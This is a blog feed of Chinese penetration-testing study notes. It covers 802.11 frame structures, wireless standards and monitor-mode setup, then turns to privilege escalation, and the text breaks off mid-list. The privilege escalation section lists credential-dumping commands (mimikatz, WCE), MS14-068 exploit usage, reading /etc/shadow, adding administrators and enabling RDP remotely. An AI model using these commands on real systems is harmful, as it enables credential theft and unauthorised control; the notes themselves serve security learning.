        <content type="html"><![CDATA[<h3 id="控制帧"><a href="#控制帧" class="headerlink" title="控制帧"></a>控制帧</h3><ul><li>Control Frame</li><li>控制帧时一些通知设备开始、停止传输或连接失败情况的短消息。</li></ul><h5 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a>ACK</h5><ul><li>接收端正确接收数据之后向发送端返回ACK确认</li><li>每个单播帧需要ACK立刻确认</li><li><ul><li>组播和广播帧不需要ACK确认</li></ul></li><li>尽快响应</li><li><ul><li>由硬件完成，而非驱动层</li></ul></li><li>T/S ：1/13</li></ul><h5 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a>PS-POLL</h5><ul><li>RF系统的放大器</li><li><ul><li>主要耗电的组件</li><li>发射前放大信号，接收并放大还原信号</li></ul></li><li>省电模式</li><li><ul><li>关闭信号发射器节省电源耗电（几乎完全关闭）</li></ul></li><li>AID ——Association ID</li><li>STA省电模式唤醒</li><li><ul><li>数据发送至AP（AP缓存数据包）</li></ul></li><li><ul><li>通过Beacon 发送TIM（traffic indication map)</li></ul></li><li><ul><li><ul><li>其中包含AID</li></ul></li></ul></li><li>STA对比AID后唤醒网卡</li><li>STA发送PS-POLL帧， 请求从AP缓存中取回数据</li><li><ul><li>每个都需要ACK确认</li></ul></li><li><ul><li>ACK确认后AP从缓存中删除数据帧</li></ul></li><li><ul><li>传输过程中STA保持唤醒状态</li></ul></li><li><ul><li>传输结束后STA恢复省电状态</li></ul></li><li>AP接收PS-Poll帧</li><li><ul><li>立刻响应</li></ul></li><li><ul><li>延迟响应</li></ul></li><li><ul><li><ul><li>简单响应帧</li></ul></li></ul></li><li>AID： 关联ID</li><li>BSSID：STA正关联的AP地址</li><li>TA：发送此帧的STA地址</li></ul><h5 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a>RTS/CTS</h5><ul><li>RTS/CTS时CSMA/CA方法的一种补充手段</li><li><ul><li>降低冲突产生的可能性</li></ul></li><li><ul><li>正式通信之间通过请求应答机制，确信通信介质的可用性</li></ul></li><li><ul><li>并锁定传输介质和预约通信时间</li></ul></li><li><ul><li>只有在传输长帧时使用，传输短帧时不会使用</li></ul></li><li><ul><li><ul><li>驱动接口提供阈值的自定义</li></ul></li></ul></li><li><ul><li><ul><li>大于阈值的帧被视为长帧，反之则视为短帧</li></ul></li></ul></li><li>Node1 发送Request to Send包给Node2</li><li>如果未发生冲突，Node2 返回Clear to Send 给Node1</li><li>Node1传输数据</li><li>数据正常接收，Node2返回ACK，否则Node1什么也不会收到</li><li>有线网络介质访问方式：CSMA/CD</li><li>无线网络介质访问方法：CSMA/CA</li><li>隐藏节点</li><li>RTS 帧长度20字节</li><li>CTS帧长度14字节</li></ul><h3 id="管理帧"><a href="#管理帧" class="headerlink" title="管理帧"></a>管理帧</h3><ul><li>Management frame</li><li>用于协商和控制STA与AP之间的关系<h5 id="Beacon-frames"><a href="#Beacon-frames" class="headerlink" title="Beacon frames"></a>Beacon frames</h5></li><li>AP 发送的广播帧，通告无线网络的存在（BSSID）</li><li>发包频率</li><li><ul><li>102.4ms(可变)</li></ul></li><li><ul><li>时间单位1024microseconds(60秒)</li></ul></li><li>SSID网络名</li><li><ul><li>隐藏AP不发SSID广播</li></ul></li><li>IBSSI Status</li><li><ul><li>0: infrastructure</li></ul></li><li><ul><li>1: ad-hoc</li></ul></li><li>Privicy</li><li><ul><li>WEP</li></ul></li><li>ESSID</li><li><ul><li>名称、长度</li></ul></li><li>速率</li><li><ul><li>802.11g(1_54Mbit)</li></ul></li><li>信道</li><li><ul><li>11<h5 id="Probe-request-frames"><a href="#Probe-request-frames" class="headerlink" title="Probe request frames"></a>Probe request frames</h5></li></ul></li><li>用于STA扫描现有AP</li><li><ul><li>发现连接过的AP</li></ul></li><li><ul><li>发现未连接的AP</li></ul></li><li>发现连接过的AP时，速率和ESSID相同的AP响应</li></ul><h5 id="Authentication-frames"><a href="#Authentication-frames" class="headerlink" title="Authentication frames"></a>Authentication frames</h5><ul><li>Authentication Algorithm 身份认证类型</li><li><ul><li>0： 开放系统身份验证</li></ul></li><li><ul><li>1： 共享密钥身份验证</li></ul></li><li>身份认证有多个帧交换过程组成</li><li>Authentication Seq</li><li><ul><li>每次身份验证过程Seq唯一</li></ul></li><li><ul><li>1-65535</li></ul></li><li>Challenge text</li><li><ul><li>只有共享密钥方式才有此字段</li></ul></li><li>Status Code：成功/失败</li></ul><h5 id="Association-Reassociation-Frames"><a href="#Association-Reassociation-Frames" class="headerlink" title="Association/Reassociation Frames"></a>Association/Reassociation Frames</h5><ul><li>身份验证成功后，STA执行关联操作，加入无线网络</li><li><ul><li>Association Request</li></ul></li><li><ul><li>Reassociation Request</li></ul></li><li><ul><li>Association Response</li><li><ul><li>AP对STA的关联请求的响应</li><li>状态码：关联成功/失败</li></ul></li></ul></li></ul><h5 id="Disassociation-Deauthentication"><a href="#Disassociation-Deauthentication" class="headerlink" title="Disassociation/Deauthentication"></a>Disassociation/Deauthentication</h5><ul><li>由AP发出（2个字节）</li></ul><h5 id="ATIM-FRAMES"><a href="#ATIM-FRAMES" class="headerlink" title="ATIM FRAMES"></a>ATIM FRAMES</h5><ul><li>只在ad-hoc网络下使用</li><li><ul><li>STA使用此帧通知接收者其有缓存的数据要发送</li></ul></li></ul><h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><ul><li>Data frames</li><li>传输用户数据</li><li>空数据帧</li><li><ul><li>NULL data frame</li><li>只包含MAC头和FCS</li><li>STA用于声明自己将要进入省电模式</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>802.11_1</title>
      <link href="/2018/03/26/802-11-1/"/>
      <url>/2018/03/26/802-11-1/</url>
      
        <content type="html"><![CDATA[<h2 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h2><h4 id="无线技术特点"><a href="#无线技术特点" class="headerlink" title="无线技术特点"></a>无线技术特点</h4><ul><li>无线技术变化快 难度大</li><li>行业迅猛发展</li><li>互联网的重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解而造成配置不当</li><li>企业网络私自接入AP破坏网络边界</li></ul><h4 id="802-11-标准"><a href="#802-11-标准" class="headerlink" title="802.11 标准"></a>802.11 标准</h4><p>IEEE</p><ul><li>Institute of Electrical and Electronics Engineers<ul><li>由通信航天生物电气电子等方面的科学家组成，目的是制定标准，指导行业技术的发展，目前成员近40万人。</li></ul></li></ul><p>• 802 委员会下第11组负责开发无线局域网标准<br>• IEEE 802.1 1 The Original WLAN Standard – 1 Mbit/s and 2 Mbit/w, 2.4 GHz RF and<br>IR<br>• IEEE 802.11a 54 Mbit/s, 5 GHz<br>• IEEE 802.11b 802.11 Enhancements to Support 5.5 Mbit/s and 11 Mbit/s<br>• IEEE 802.11c Bridge Operation Procedures<br>• IEEE 802.11d International (Country to Country) Roaming Extensions<br>• IEEE 802.11 e Quality of Service ( QoS ), Including Packet Bursting<br>• IEEE 802.11F Inter -Access Point Protocol<br>• IEEE 802.11g 54 Mbit/s, 2.4 GHz<br>• IEEE 802.11h Spectrum Managed 802.11a (5 GHz) for European Compatibility<br>• IEEE 802.11i Enhanced Security</p><p>• IEEE 802.11j Extensions for Japan<br>• IEEE 802.11k Radio Resource Measurement Enhancements<br>• IEEE 802.11n Higher Throughput Using Multiple Input, Multiple Output<br>(MIMO) Antennas<br>• IEEE 802.11p Wireless Access for the Vehicular Environment (WAVE)<br>• IEEE 802.11r Fast BSS Transition (FT)<br>• IEEE 802.11s Mesh Networking, Extended Service Set (ESS)<br>• IEEE 802.11T Wireless Performance Prediction (WPP)<br>• IEEE 802.11u Internetworking with Non -802 Networks ( i.e. : Cellular)<br>• IEEE 802.11v Wireless Network Management </p><p>• IEEE 802.11w Protected Management Frames<br>• IEEE 802.11y 3650 – 3700 MHz Operation in the US<br>• IEEE 802.11z Direct Link Setup (DLS) Extensions<br>• IEEE 802.11mb Maintenance of the Standard<br>• IEEE 802.11aa Robust Streaming of Audio Video Transport Streams<br>• IEEE 802.11ac Very High Throughput &lt; 6 GHz<br>• IEEE 802.11ad Very High Throughput, 60 GHz<br>• IEEE 802.11ae QoS Management<br>• IEEE 802.11af TV Whitespace<br>• IEEE 802.11ah Sub 1 GHz<br>• IEEE 802.11ai Fast Initial Link Setup </p><p>802.11</p><ul><li>发布于1997年</li><li>速率1Mbps 或 2Mbps</li><li>红外线传输介质（未实现）</li><li>无线射频信号编码（调制）（radio frequencies)</li><li><ul><li>Direct-Sequence Spread-Spectrum(DSSS)——直序扩频</li><li>Frequency Hopping Spread-Spectrum(FHSS)——跳频扩频</li></ul></li><li>媒体访问方式——CSMA/CA c=b+log2(1+s/n)</li><li><ul><li>根据算法侦听一定时长</li><li>发送数据前发包声明</li></ul></li><li>Request to Send / Clear to Send(RTS/CTS)</li></ul><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h4><ul><li>Complementary Code Keying(CCK)——补充代码键</li><li><ul><li>5.5 and 11 Mbit/s</li><li>2.4GHz band(2.4Ghz - 2.485GHz)</li><li>14个重叠的信道channels</li><li>每个信道22MHz带宽</li><li>只有三个完全不重叠的信道</li></ul></li><li>美国-1 to 11(2.412GHz - 2.462GHz)</li><li>欧洲-1 to 13(2.412Ghz - 2.472GHz)</li><li>日本-1 to 14(2.412GHz - 2.484GHz)</li></ul><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><ul><li>与802.11b几乎同时发布</li><li><ul><li>因设备价格问题一直没有得到广泛使用</li></ul></li><li>使用5GHz带宽</li><li><ul><li>使用2.4GHz带宽干扰源多（微波、蓝牙、无绳电话）</li><li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法</li><li><ul><li>正交频分复用技术</li></ul></li><li>更高速率54Mbps, 每个信道20MHz带宽</li><li>变频</li><li><ul><li>5.15-5.35GHz 室内</li><li>5.7-5.8GHz 室外</li></ul></li></ul></li></ul><h4 id="802-11g"><a href="#802-11g" class="headerlink" title="802.11g"></a>802.11g</h4><ul><li>2.4GHz频率</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法</li><li>与802.11a速率相同</li><li>可全局降速 向后兼容802.11b, 并切换为CCK信号调制方法</li><li>每个信道20/22MHz 带宽</li></ul><h4 id="802-11n"><a href="#802-11n" class="headerlink" title="802.11n"></a>802.11n</h4><ul><li>2.4或5GHz 频率</li><li><ul><li>300Mbps 最高 600Mbps</li><li>Multiple-Input Multiple-Output(MIMO)多进多出通信技术</li><li>多天线，多无线电波，独立收发信号</li><li>可以使用40MHz信道带宽是数据传输速率翻倍</li></ul></li><li>全802.11n设备网络中，可以使用新报文格式，是速率达到最大</li><li>每个信道20/40MHz 带宽</li></ul><h4 id="无线"><a href="#无线" class="headerlink" title="无线"></a>无线</h4><ul><li>/应用层</li><li>/表示层</li><li>/会话层</li><li>/传输层</li><li>/网络层</li><li>数据链路层<ul><li>逻辑链路控制子层LLC</li><li>媒体访问控制子层MAC</li></ul></li><li>物理层</li></ul><h3 id="无线网路运行模式"><a href="#无线网路运行模式" class="headerlink" title="无线网路运行模式"></a>无线网路运行模式</h3><ul><li>无线网络架构</li><li>Indrastructure</li><li><ul><li>AP 维护SSID</li></ul></li><li>Ad-Hoc</li><li><ul><li>STA维护SSID</li></ul></li><li>Service Set Indentifier(SSID)</li><li><ul><li>AP 每秒约十次通过Beacon帧广播SSID</li><li>客户端连接到无线网络后也会宣告SSID</li></ul></li><li>Infrastructure</li><li><ul><li>至少包含一个AP和一个STATION， 形成一个Basic Service Set(BSS)</li><li>AP连接到有线网络，称为Distribution System(DS)</li><li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li></ul></li><li>AD-HOC</li><li><ul><li>也被称为Independent Basic Service Set(IBSS)</li><li>有至少2个STAs直接通信组成</li><li>也称为peer to peer 模式</li><li>其中一个STA负责AP的工作</li><li><ul><li>通过beacon广播SSID</li><li>对其他STAs进行身份验证</li></ul></li></ul></li><li>Wireless Distribution System(WDS)</li><li><ul><li>与有线DS类似，只是通过无线连接的多个AP组成的网络</li><li><ul><li>Bridging ——只有AP间彼此通信</li><li>Repeating ——允许所有AP和STA进行通信</li></ul></li></ul></li><li>Monitor Mode</li><li><ul><li>Monitor 不是一种真的无线模式</li><li>但是对无线渗透至关重要</li><li>允许无线网卡没有任何筛选的抓包（802.11包头）</li><li>与有线网络的混杂模式可以类比</li><li>适合的网卡和驱动不但可以monitor， 更可以Injection</li></ul></li></ul><h3 id="无线网硬件设备及基本概念"><a href="#无线网硬件设备及基本概念" class="headerlink" title="无线网硬件设备及基本概念"></a>无线网硬件设备及基本概念</h3><ul><li>无线网卡准备</li><li>物理机运行kali</li><li>虚拟机运行kali</li><li><ul><li>外置USB无线网卡</li><li>TL-WN77N（个人建议）</li><li>dmesg</li><li>iwconfig</li></ul></li><li>发射功率：远程连接</li><li>接受灵敏性：适当降低灵敏度，接受效果更佳</li><li>经验</li><li><ul><li>Atheros 或 Realtek</li><li>没有神器</li><li>兼容aircrack-ng suite</li></ul></li><li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters</a></li><li>Alfa Networks AWUS036H 无线网卡</li><li><ul><li>Realtek 8187 芯片</li><li>1000mW发射功率</li><li>天线：RP-SMA</li><li><ul><li>可扩展</li></ul></li></ul></li></ul><h4 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a>无线技术概念</h4><ul><li>分贝dB</li><li><ul><li>测量无线信号强度</li></ul></li><li>B：向Alexander Graham Bell 致敬</li><li><ul><li>今天大部分声学设备的发明者和理论奠基人</li></ul></li><li>dB : 表示2个信号之间的差异比率，用于描述设备的信号强度</li><li><ul><li>是一个相对值</li></ul></li><li>dBm:功率值与1mW 进行比较的dB值结果</li><li>每增加3dBm, 功率增加约1倍</li><li>每增加10dBm, 功率增加10倍</li><li>dBi：全向天线辐射强度</li><li>dBd: 定向天线辐射强度</li><li>dBi:</li><li><ul><li>全向天线的信号功率增益</li><li>增益是指信号功率强度增加了多少dB</li><li>dBm功率相加等于mw功率相乘</li></ul></li><li>dBd</li><li><ul><li>是定向天线的增益值</li><li>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</li><li>天线增益越大信号传输距离越远</li></ul></li><li>既然有mW来表示功率为什么还要引入dB这个单位？</li><li>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W，mW来计数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位。</li><li>全向天线波形图</li><li><ul><li>甜甜圈</li></ul></li><li>天线选择的误区</li><li><ul><li>增益越高越好</li><li><ul><li>高功耗</li><li>对周围环境的信号干扰</li></ul></li></ul></li><li>增益过高的全向天线会变成定向天线</li><li>定向天线</li><li><ul><li>双四边形</li><li>定向发现信号</li><li>功率相同时，比全向天线传输距离更远</li><li>八木天线，引向反射天线</li><li>平面天线</li><li>扇形天线</li><li><ul><li>常用于移动电话网络</li><li>3到4个扇形天线联合使用可实现全向信号覆盖</li></ul></li><li>90度扇形天线</li><li>120度扇形天线</li><li>网状天线 射束带宽更加集中 功率更强</li></ul></li></ul><h3 id="Linux无线协议栈及配置命令"><a href="#Linux无线协议栈及配置命令" class="headerlink" title="Linux无线协议栈及配置命令"></a>Linux无线协议栈及配置命令</h3><p>802.11协议栈</p><ul><li>IEEE802.11</li><li><ul><li>iwconfig</li><li>iwlist</li></ul></li><li>mac80211</li><li><ul><li>iw</li></ul></li></ul><h4 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h4><ul><li>查看无线网卡</li><li><ul><li>ifconfig</li><li>iwconfig</li><li>iw list</li></ul></li><li>信道频率</li><li><ul><li>iwlist wlan2 frequency</li><li>iw list</li></ul></li><li>扫描附近AP</li><li><ul><li>iw dev wlan2 scan | grep SSID</li><li>iw dev wlan2 scan | egrep “DS\ Parameter\ set | SSID”</li><li>iwlist wlan2 scanning | egrep “ESSID | Channel”</li></ul></li><li>添加删除侦听端口</li><li><ul><li>service network-manager stop</li><li>iw dev wlan2 interface add wlan2mon type monitor</li><li>ifconfig wlan2mon up</li><li><ul><li>tcpdump -s 0 -i wlan2mon -p</li></ul></li><li>iw dev wlan2mon interface del</li></ul></li><li>协议栈</li><li><ul><li><a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a></li></ul></li><li>无线驱动</li><li><ul><li><a href="http://linuxwireless.org/en/users/Drivers/" target="_blank" rel="noopener">http://linuxwireless.org/en/users/Drivers/</a></li></ul></li></ul><h3 id="RADIOTAP头部"><a href="#RADIOTAP头部" class="headerlink" title="RADIOTAP头部"></a>RADIOTAP头部</h3><ul><li>802.11帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</li><li>Linux系统在驱动和API中内建支持Radiotap</li><li>802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧包含Radiotap头</li><li>Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</li><li>不破坏原始头结构，增加传递的信息</li><li>分为Header 和 data</li><li>Version(8bit)</li><li><ul><li>值始终为0</li></ul></li><li>Pad(8bit)</li><li><ul><li>未使用，只作为字段强制对其的占位</li></ul></li><li>Length(16bit)</li><li><ul><li>整个radiotap头长度（可变），作用时确定802.11头的开始位置</li></ul></li><li>Present(32bit)</li><li><ul><li>Data段的掩码</li><li>Ext(1\0)</li><li>MAC不能理解的头部直接忽略</li></ul></li></ul><h4 id="802-11-头部"><a href="#802-11-头部" class="headerlink" title="802.11 头部"></a>802.11 头部</h4><ul><li>DU（Data Unit) 即数据单元，信息传输的最小数据集合</li><li>传递过程逐层封装（Encapsulation)</li><li>SDU(Service Data Unit) / PDU(Protocol Data Unit)</li><li>MSDU - MIC -  分帧 - 添加IV – 加密 – 添加MAC头部 —— MPDU</li><li>MPDU/PSDU + 物理头 = PPDU —— RF发射</li><li>Protocol Version (2bit) : 802.11协议版本，始终为0、1、2、</li><li>Type(2bit) :规定帧的具体用途（3种帧类型）</li><li><ul><li>控制帧（1）</li><li>数据帧（2）</li><li>管理帧（0）</li></ul></li><li>SubType(4bit)</li><li><ul><li>每个类型对应多个子类型，协议规定不同类型/子类型的帧完成不同功能的操作</li></ul></li><li>To DS / From DS (1 / 1 bit)</li><li><ul><li>标识帧的传输方向，传向DS或者来自DS，这两个字段的值决定着MAC头中4个Address字段的不同定义。</li><li>0x00:出现在IBSS环境中（可能是Management帧或者是Control帧类型）；或者是STSL（Station to Station Link)中两个STA间通信，这种情况下通信不通过AP</li><li>0x01:表示Data帧从AP向STA传递；</li><li>0x02:表示Data帧从STA向AP传递；</li><li>0x03:表示两个AP间通信，这是典型的WDS(Wireless Distribution System) 环境中AP间的通信，或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段</li></ul></li><li>More frag(1bit): 表示是否还有后续帧</li><li><ul><li>值为1时表示有后续分段，可能是Data或Management帧类型。只有单播接受地址的帧会被分段；</li></ul></li><li>Retry(1bit):重传</li><li><ul><li>值为1表示重传帧，可能是Data或Management帧类型，接收端进程使用此值防止帧重复；</li></ul></li><li>Power Mgmt(1bit):活动模式（0）/ 省电模式（1）</li><li><ul><li>STA处于省电模式时，向关联的AP发送该值为1的帧（AP从不使用此字段），省电模式下STA不接收数据，发送给它的Data帧由AP暂时缓存。</li></ul></li><li>More Data(1bit)</li><li><ul><li>当AP缓存了至少一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己并向AP发送PS-Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播/多播帧需要发送的情况。</li></ul></li><li>Protected Frame(1bit)</li><li><ul><li>可能是Data 或 Management 帧类型，表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧； 数据载荷为空时，该字段值为0；</li></ul></li><li>Order(1bit)</li><li><ul><li>在非QoS帧的情况下，值为1表示数据必须按严格顺序处理，通常为0；</li></ul></li><li>Duration/ID (16bit)</li><li><ul><li>所有Control帧都使用该字段，其作用随Type / SubType 变化有所不同</li><li>帧类型为PS Poll(type:1, subtype:10)时， 表示STA关联的AID（association identity)</li><li>其他情况下该字段作为一种载波侦听机制，表示接收下一帧之间需要保持的时间间隔，用于NAV（Network Allocation Vector)计算，单位是微秒。</li></ul></li><li>MAC Layer Address</li><li><ul><li>补充最后一种： Basic service set ID(BSSID); 它是BSS 的2层唯一标识，Infrastructure 模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID；</li></ul></li><li>Sequence Control (16bit)</li><li><ul><li>这个字段包含两个子字段： Sequence Number 和 Fragment Number;</li><li>Sequence Number 是每个帧的编号，数值范围是0——4095，以1为步长递增。当帧被分段时，同意帧中不同分段的Sequence Number 相同；</li><li>Fragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围是0——15,以1为步长递增。</li></ul></li><li>Frame Body（变长）</li><li><ul><li>数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的数据2048字节）。不同的加密方法会增加一定的内容长度。</li><li>WEP：8 bytes - 2312 bytes</li><li>TKIP(WPA1): 20 bytes - 2324 bytes</li><li>CCMP(WPA2): 16 bytes - 2320 bytes</li><li>control 类型的帧没有Frame Body 内容</li></ul></li><li>FCS（32bit）</li><li><ul><li>发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS（Frame Check Sequence)值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广播/多播帧可能被接收）</li><li>wireshark抓包时已经删除了FCS值</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>提权</title>
      <link href="/2018/03/21/%E6%8F%90%E6%9D%83/"/>
      <url>/2018/03/21/%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><ul><li>已实现本地低权限账号登陆<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获取更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动服务</li></ul></li><li>Windows<ul><li>user</li><li>Administrator</li><li>System</li></ul></li><li>Linux<ul><li>User</li><li>Root </li></ul></li><li>Windows system账号<ul><li>系统设置管理功能</li><li>SysInternal Suite<ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb545027" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/bb545027</a></li><li>psexec -i -s -d taskmgr</li></ul></li><li><code>at 19:39 /interactive cmd</code> Win XP Win 2003</li><li><code>sc Create syscmd binPath= &quot;cmd /K start&quot; type=own type=interact</code></li><li><code>sc start syscmd</code> </li></ul></li></ul><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul><li>隐蔽痕迹</li><li>pinjector.exe<ul><li><code>http://www.tarasco.org/security/Process_Injector/</code></li></ul></li></ul><h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><ul><li>Windows<ul><li>Wireshark</li><li>Omnipeek</li><li>commview</li><li>Sniffpass</li></ul></li><li>Linux</li><li><ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff</li></ul></li></ul><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><ul><li>Keylogger</li><li>木马窃取</li></ul><h4 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h4><ul><li>浏览器缓存的密码</li><li><ul><li>IE浏览器</li><li>Firefox</li></ul></li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li><li>Dump SAM</li><li><ul><li>Pwdump</li><li>/usr/share/windows-binaries/fgdump/</li><li>ophcrack</li></ul></li></ul><h4 id="Windows身份认证"><a href="#Windows身份认证" class="headerlink" title="Windows身份认证"></a>Windows身份认证</h4><p>WINLOGON.EXE — LSA AUTH API(LSASRV.DLL) — MSV1_0.DLL(NTLM AUTH PKG)</p><p>WCE(Windows Credential Editor) 内存读取信息</p><ul><li>/usr/share/wce</li><li>需要管理员权限</li><li><code>wce-universal.exe -l / -lv</code></li><li><code>wce-universal.exe -w</code></li><li>从内存读取LM/NTLM hash</li><li>Digest Authentication Package</li><li>NTLM Security Package</li><li>Kerberos Security Package</li><li>防止WCE攻击</li><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</li></ul><p>其他工具</p><ul><li>pwddump localhost</li><li>fgdump</li><li>mimikatz</li><li><ul><li>privilege::debug #提升权限</li><li>sekurlsa::logonPasswords</li></ul></li></ul><h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul><li>Ms11-080</li><li>Kb2592799</li><li><ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li>Pyinstaller</li><li><ul><li><a href="https://pypi.python.org/pypi/PyInstaller/2.1" target="_blank" rel="noopener">https://pypi.python.org/pypi/PyInstaller/2.1</a></li></ul></li><li>Pywin32</li><li><ul><li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a></li></ul></li><li>MS11-046</li><li><ul><li>DoS</li></ul></li><li>MS14-068</li><li>库</li><li><ul><li><a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li></ul></li><li>ms14-068.py -u <a href="mailto:user@lab.com" target="_blank" rel="noopener">user@lab.com</a> -s userSID -d dc.lab.com</li><li>拷贝 <a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a> 到Windows系统</li><li>本地管理员登陆</li><li><ul><li>mimikatz.exe log “kerberos::ptc <a href="mailto:TGT_user@lab.com.ccache" target="_blank" rel="noopener">TGT_user@lab.com.ccache</a>“ exit</li></ul></li><li>Ubuntu 11.10</li><li><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li></ul></li><li>gcc</li><li><ul><li>sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</li><li>gcc 18411.c -o exp</li></ul></li><li>CVE-2012-0056</li><li><ul><li>/proc/pid/mem</li><li>kernels&gt;=2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li></ul></li></ul><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul><li>与漏洞提权相比 更常用的方法</li><li><ul><li>企业环境</li><li>补丁更新的全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li><li>以system权限启动</li><li>NTFS权限允许users修改删除</li></ul></li><li>icacls</li><li><ul><li>icacls c:\windows*.exe /save perm /T</li><li>i586-mingw32msvc-gcc -o admin.exe</li></ul></li><li>Find</li><li><ul><li>find / -perm 777 -exec ls -l {} \;</li></ul></li><li>应用系统的配置文件</li><li><ul><li>应用连接数据库的配置文件</li><li>后台服务运行账号</li></ul></li></ul><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><ul><li><p>Linux</p></li><li><ul><li>/etc/resolv.conf</li><li>/etc/passwd</li><li>/etc/shadow</li><li>whoami, who -a</li><li>ifconfig -a, iptables -L -n, ifconfig -a, netstat -r</li><li>uname -a. ps aux</li><li>dpkg -l | head</li></ul></li><li><p>Windows</p></li><li><ul><li>ipconfig /all, ipconfig /displaydns, netstat -bnao , netstat -r</li><li>net view, net view /domain</li><li>net user /domain, net user %username% /domain</li><li>net accounts, net share</li><li>net locakgroup administrators username /add</li><li>net group “Domain Controllers” /domain</li><li>net share name$=C:\/unlimited</li><li>net user username /active:yes /domain</li></ul></li><li><p>WMIC(Windows Management Inustrumentation)</p><p>• wmic nicconfig get ipaddress,macaddress<br>• wmic computersystem get username<br>• wmic netlogin get name,lastlogon<br>• wmic process get caption, executablepath,commandline<br>• wmic process where name=“calc.exe” call terminate<br>• wmic os get name,servicepackmajorversion<br>• wmic product get name,version<br>• wmic product where name=“name” call uninstall /nointeractive<br>• wmic share get /ALL<br>• wmic /node:”machinename” path Win32_TerminalServiceSetting where<br>AllowTSConnections=”0” call SetAllowTSConnections “1“<br>• wmic nteventlog get path,filename, writeable</p></li></ul><h4 id="收集敏感数据"><a href="#收集敏感数据" class="headerlink" title="收集敏感数据"></a>收集敏感数据</h4><ul><li>商业信息</li><li>系统信息</li><li>Linux</li><li><ul><li>/etc; /usr/local/etc</li><li>/etc/password; /etc/shadow</li><li>.ssh .gnupg 公私密钥</li><li>The 